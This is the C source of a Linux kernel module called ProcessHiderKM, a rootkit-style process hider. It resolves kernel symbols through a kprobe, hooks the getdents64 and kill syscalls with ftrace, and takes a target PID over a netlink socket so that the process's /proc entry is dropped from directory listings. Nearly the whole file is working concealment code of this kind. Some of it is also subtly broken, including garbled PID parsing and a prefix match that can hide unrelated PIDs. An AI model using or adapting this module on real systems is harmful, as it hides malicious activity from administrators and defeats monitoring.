#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/dirent.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/linkage.h>
#include <linux/skbuff.h>
#include <net/sock.h>

static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};

typedef struct _FtraceHook {
  const char* name;
  void* hookFunc;
  void* targetFunc;
  unsigned long address;
  struct ftrace_ops ftrops;
} FtraceHook, *PFtraceHook;

static int fhResolveHookAddress(PFtraceHook pHook);

int fhInstallHook(PFtraceHook pHook);

void fhRemoveHook(PFtraceHook pHook);

static void fhGetFtraceThunk(unsigned long ip, unsigned long parentIp,
                             struct ftrace_ops* pFtrops,
                             struct ftrace_regs* pFtrRegs);

static asmlinkage long (*syscallKill)(const struct pt_regs*);

static asmlinkage long (*syscallGetdents64)(const struct pt_regs*);

asmlinkage int hookedGetdents64(const struct pt_regs* pRegs);

asmlinkage int hookedKill(const struct pt_regs* pRegs);

static void netlinkInputRoutine(struct sk_buff* skb);

static int netlinkBindRoutine(struct net* net, int group);

// static void netlinkUnbindRoutine(struct net *net, int group);

// static void netlinkReleaseRoutine(struct sock *sk, unsigned long *groups);

static FtraceHook ftrhookKill = {.name = "__x64_sys_kill",
                                 .hookFunc = hookedKill,
                                 .targetFunc = &syscallKill};

static FtraceHook ftrhookGetdents64 = {.name = "__x64_sys_getdents64",
                                       .hookFunc = hookedGetdents64,
                                       .targetFunc = &syscallGetdents64};

static struct netlink_kernel_cfg netlinkCfg = {
    .input = netlinkInputRoutine,
    // .bind = netlinkBindRoutine,
    // .unbind = netlinkUnbindRoutine,
    // .release = netlinkReleaseRoutine,
};

static struct sock* pNetlinkSock = NULL;

static unsigned int uiTargetPID;

int __init init_module() {
  pr_info("[ProcessHiderKM] init_module called");

  int iErr = 0;

  iErr = fhInstallHook(&ftrhookGetdents64);
  if (iErr) {
    pr_info("[ProcessHiderKM] Installing hook for getdents64 failed %d", iErr);
    return iErr;
  }

  iErr = fhInstallHook(&ftrhookKill);
  if (iErr) {
    pr_info("[ProcessHiderKM] Installing hook for kill failed %d", iErr);
    return iErr;
  }

  pNetlinkSock = netlink_kernel_create(&init_net, 30, &netlinkCfg);
  if (!pNetlinkSock) {
    pr_info("[ProcessHiderKM] netlink_kernel_create failed");
    return -1;
  }

  pr_info("[ProcessHiderKM] Successfully created netlink socket");

  pr_info("[ProcessHiderKM] Successfully inserted module");
  return 0;
}

void __exit cleanup_module() {
  pr_info("[ProcessHiderKM] cleanup_module called");

  netlink_kernel_release(pNetlinkSock);

  fhRemoveHook(&ftrhookGetdents64);
  fhRemoveHook(&ftrhookKill);

  pr_info("[ProcessHiderKM] Successfully remove module");
}

static int fhResolveHookAddress(PFtraceHook pHook) {
  typedef unsigned long (*kallsyms_lookup_name_t)(const char* name);
  kallsyms_lookup_name_t kallsyms_lookup_name;
  register_kprobe(&kp);
  kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);
  if (!kallsyms_lookup_name) {
    pr_info("[ProcessHiderKM] Cannot find kallsyms_lookup_name using kprobes");
    return -ENOENT;
  }

  pHook->address = kallsyms_lookup_name(pHook->name);
  if (!pHook->address) {
    pr_info("[ProcessHiderKM] kallsyms_lookup_name failed: name not found");
    return -ENOENT;
  }

  *((unsigned long*)pHook->targetFunc) = pHook->address;
  return 0;
}

int fhInstallHook(PFtraceHook pHook) {
  int iErr = 0;
  iErr = fhResolveHookAddress(pHook);
  if (iErr) {
    pr_info("[ProcessHiderKM] fhResolveHookAddress failed");
  }

  pHook->ftrops.func = fhGetFtraceThunk;
  pHook->ftrops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
                        FTRACE_OPS_FL_IPMODIFY;

  pr_info("[ProcessHiderKM] pHook->address is %lu", pHook->address);
  iErr = ftrace_set_filter_ip(&pHook->ftrops, pHook->address, 0, 0);
  if (iErr) {
    pr_info("[ProcessHiderKM] ftrace_set_filter_ip failed %d", iErr);
    return iErr;
  }

  iErr = register_ftrace_function(&pHook->ftrops);
  if (iErr) {
    pr_info("[ProcessHiderKM] register_ftrace_function failed %d", iErr);
    return iErr;
  }

  return 0;
}

void fhRemoveHook(PFtraceHook pHook) {
  int iErr;

  iErr = unregister_ftrace_function(&pHook->ftrops);
  if (iErr) {
    pr_info("[ProcessHiderKM] unregister_ftrace_function failed %d", iErr);
    return;
  }

  iErr = ftrace_set_filter_ip(&pHook->ftrops, pHook->address, 1, 0);
  if (iErr) {
    pr_info("[ProcessHiderKM] ftrace_set_filter_ip failed %d", iErr);
    return;
  }
}

static void fhGetFtraceThunk(unsigned long ip, unsigned long parentIp,
                             struct ftrace_ops* pFtrops,
                             struct ftrace_regs* pFtrRegs) {
  PFtraceHook pHook = container_of(pFtrops, FtraceHook, ftrops);
  struct pt_regs* pRegs = ftrace_get_regs(pFtrRegs);

  if (!within_module(parentIp, THIS_MODULE)) {
    pRegs->ip = (unsigned long)pHook->hookFunc;
  }
}

asmlinkage int hookedGetdents64(const struct pt_regs* pRegs) {
  if (!uiTargetPID) {
    return syscallGetdents64(pRegs);
  }

  struct linux_dirent64* pDirentParam = (struct linux_dirent64*)pRegs->si;
  int iErr = 0;

  int iDirentSize = syscallGetdents64(pRegs);
  if (iDirentSize == 0) {
    return 0;
  }
  if (iDirentSize < 0) {
    pr_info("[ProcessHiderKM] The getdents64 original syscall failed %d",
            iDirentSize);
    return iDirentSize;
  }

  struct linux_dirent64* pDirentParamK = kzalloc(iDirentSize, GFP_KERNEL);
  iErr = copy_from_user(pDirentParamK, pDirentParam, iDirentSize);
  if (iErr) {
    pr_info("[ProcessHiderKM] copy_from_user failed");
    pr_info(
        "[ProcessHiderKM] Failed call: copy_from_user(pDirentParamK, "
        "pDirentParam, iDirentSize)");
    kfree(pDirentParamK);
    return iDirentSize;
  }

  unsigned long ulCurOffset = 0;
  struct linux_dirent64* pDirentCur;
  struct linux_dirent64* pDirentPrev;
  char acTargetPID[10] = "";
  unsigned long ulSuccess = 0;
  sprintf(acTargetPID, "%d", uiTargetPID);
  while (ulCurOffset < iDirentSize) {
    pDirentCur = (void*)pDirentParamK + ulCurOffset;

    // pr_info("[ProcessHiderKM] acTargetPID = %s", acTargetPID);
    // pr_info("[ProcessHiderKM] pDirentCur->d_name = %s", pDirentCur->d_name);

    if (!memcmp(acTargetPID, pDirentCur->d_name, strlen(acTargetPID))) {
      pr_info("[ProcessHiderKM] Hiding directories at /proc/%d/", uiTargetPID);
      if (pDirentCur == pDirentParamK) {
        iDirentSize -= pDirentCur->d_reclen;
        memmove(pDirentCur, (void*)pDirentCur + pDirentCur->d_reclen,
                iDirentSize);
        continue;
      }
      pDirentPrev->d_reclen += pDirentCur->d_reclen;
      ulSuccess = 1;
    } else {
      pDirentPrev = pDirentCur;
    }
    ulCurOffset += pDirentCur->d_reclen;
  }

  iErr = copy_to_user(pDirentParam, pDirentParamK, iDirentSize);
  if (iErr) {
    pr_info("[ProcessHiderKM] copy_to_user failed");
    pr_info(
        "[ProcessHiderKM] Failed call: copy_to_user(pDirentParam, "
        "pDirentParamK, iDirentSize");
    kfree(pDirentParamK);
    return iDirentSize;
  }

  if (ulSuccess) {
    pr_info("[ProcessHiderKM] Successfully hide process PID = %d", uiTargetPID);
    // uiTargetPID = 0;
  }

  kfree(pDirentParamK);
  return iDirentSize;
}

asmlinkage int hookedKill(const struct pt_regs* pRegs) {
  if (!uiTargetPID) {
    return syscallKill(pRegs);
  }

  // pid_t pid = pRegs->di;
  // int sig = pRegs->si;

  // if (pid == uiTargetPID) {
  //     pr_info("[ProcessHiderKM] Process PID = %d is about to be killed",
  //     uiTargetPID);
  // }

  return syscallKill(pRegs);
}

static void netlinkInputRoutine(struct sk_buff* skb) {
  pr_info("[ProcessHiderKM] netlinkInputRoutine called");

  struct nlmsghdr* pnlh;
  struct sk_buff* pskbOutput;
  unsigned int uiPortID, uiRes, uiMsgSize;

  pnlh = (struct nlmsghdr*)skb->data;
  pr_info("[ProcessHiderKM] Received message from user mode: %s",
          (char*)nlmsg_data(pnlh));

  uiPortID = pnlh->nlmsg_pid;

  for (int i = 0; i < 32; ++i) {
    char* pc = (char*)nlmsg_data(pnlh) + i;
    uiTargetPID += (*pc - '0') << i;
  }

  char acMsg[] = "ok";
  uiMsgSize = strlen(acMsg);

  pskbOutput = nlmsg_new(uiMsgSize, 0);
  if (!pskbOutput) {
    pr_info("[ProcessHiderKM] nlmsg_new failed");
    return;
  }

  pnlh = nlmsg_put(pskbOutput, 0, 0, NLMSG_DONE, uiMsgSize, 0);

  NETLINK_CB(pskbOutput).dst_group = 0;

  strncpy(nlmsg_data(pnlh), acMsg, uiMsgSize);

  uiRes = nlmsg_unicast(pNetlinkSock, pskbOutput, uiPortID);

  if (uiRes < 0) {
    pr_info("[ProcessHiderKM] nlmsg_unicast failed, return value is %d", uiRes);
    return;
  }
}

static int netlinkBindRoutine(struct net* net, int group) {
  pr_info("[ProcessHiderKM] netlinkBindRoutine called");

  return 0;
}

MODULE_LICENSE("GPL");